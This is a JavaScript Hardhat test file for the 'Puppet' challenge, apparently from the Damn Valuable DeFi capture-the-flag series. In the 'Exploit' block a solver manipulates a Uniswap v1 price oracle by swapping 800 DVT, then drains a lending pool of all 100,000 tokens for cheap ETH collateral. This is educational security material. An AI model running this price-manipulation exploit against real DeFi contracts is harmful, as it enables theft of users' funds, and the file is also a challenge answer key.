const exchangeJson = require("../../build-uniswap-v1/UniswapV1Exchange.json");
const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');

// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
    return tokensSold.mul(ethers.BigNumber.from('997')).mul(etherInReserve).div(
        (tokensInReserve.mul(ethers.BigNumber.from('1000')).add(tokensSold.mul(ethers.BigNumber.from('997'))))
    )
}

describe('[Challenge] Puppet', function () {
    let deployer, attacker;

    // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('10');
    const UNISWAP_INITIAL_ETH_RESERVE = ethers.utils.parseEther('10');

    const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000');
    const ATTACKER_INITIAL_ETH_BALANCE = ethers.utils.parseEther('25');
    const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('100000')

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.evm.bytecode, deployer);

        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const PuppetPoolFactory = await ethers.getContractFactory('PuppetPool', deployer);

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x15af1d78b58c40000", // 25 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ATTACKER_INITIAL_ETH_BALANCE);

        // Deploy token to be traded in Uniswap
        this.token = await DamnValuableTokenFactory.deploy();

        // Deploy a exchange that will be used as the factory template
        this.exchangeTemplate = await UniswapExchangeFactory.deploy();

        // Deploy factory, initializing it with the address of the template exchange
        this.uniswapFactory = await UniswapFactoryFactory.deploy();
        await this.uniswapFactory.initializeFactory(this.exchangeTemplate.address);

        // Create a new exchange for the token, and retrieve the deployed exchange's address
        let tx = await this.uniswapFactory.createExchange(this.token.address, { gasLimit: 1e6 });
        const { events } = await tx.wait();
        this.uniswapExchange = await UniswapExchangeFactory.attach(events[0].args.exchange);

        // Deploy the lending pool
        this.lendingPool = await PuppetPoolFactory.deploy(
            this.token.address,
            this.uniswapExchange.address
        );

        // Add initial token and ETH liquidity to the pool
        await this.token.approve(
            this.uniswapExchange.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await this.uniswapExchange.addLiquidity(
            0,                                                          // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
        );

        // Ensure Uniswap exchange is working as expected
        expect(
            await this.uniswapExchange.getTokenToEthInputPrice(
                ethers.utils.parseEther('1'),
                { gasLimit: 1e6 }
            )
        ).to.be.eq(
            calculateTokenToEthInputPrice(
                ethers.utils.parseEther('1'),
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );

        // Setup initial token balances of pool and attacker account
        await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
        expect(
            await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther('1'))
        ).to.be.eq(ethers.utils.parseEther('2'));

        expect(
            await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE.mul('2'));
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        /**
         * The vulnerability here is that the Lending pool reads DVT prices from an on-chain 'oracle' - the Uniswap v1 pair. Through a liquidity manipulation (through swap), we can tilt the exchange rate in our favour, and essentially empty the DVT reserve of lending pool for a very low amount of Eth.
         * 
         * This manipulation is simple - we must inflate the amount of DVT in the exchange so that it gets devalued to Eth
         * 
         * Here's the attack steps:
         * 
         *  1. Swap Del DVT = 800
            2. Amount of loan needed from lender = 100000 DVT
               Use ETH collateral = 30.57 ETH (with new Eth conversion rate from manipulated Uniswap exchange)
         */

        // 1.
        const delDvt = ethers.utils.parseEther("800");
        await (await this.token.connect(attacker).approve(this.uniswapExchange.address, delDvt)).wait();
        const { events: swapEvents } = await (await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(delDvt, ethers.utils.parseEther("0.0000001"), Math.ceil(Date.now() / 1000) + 180)).wait();
        const { tokens_sold, eth_bought } = swapEvents.find(({ event }) => event === "EthPurchase").args;

        const exchangeEthBalance = await ethers.provider.getBalance(this.uniswapExchange.address);
        const exchangeDvtBalance = await this.token.balanceOf(this.uniswapExchange.address);
        const ethDepositRequired = POOL_INITIAL_TOKEN_BALANCE.mul(2).mul(exchangeEthBalance).div(exchangeDvtBalance);
        const attackerBalance = await ethers.provider.getBalance(attacker.address);

        console.log(`[+] DVT swapped: ${ethers.utils.formatEther(tokens_sold)}, ETH received: ${ethers.utils.formatEther(eth_bought)}, ETH deposit required: ${ethers.utils.formatEther(ethDepositRequired)}, Attacker ETH balance: ${ethers.utils.formatEther(attackerBalance)}`);

        // 2.
        await (await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, { value: ethDepositRequired })).wait();

        const attackerDvtBalance = await this.token.balanceOf(attacker.address);
        const attackerEthBalance = await ethers.provider.getBalance(attacker.address);

        console.log(`[+] Attacker ETH balance: ${ethers.utils.formatEther(attackerEthBalance)}, Attacker DVT balance: ${ethers.utils.formatEther(attackerDvtBalance)}`)
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool        
        expect(
            await this.token.balanceOf(this.lendingPool.address)
        ).to.be.eq('0');
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.gt(POOL_INITIAL_TOKEN_BALANCE);
    });
});


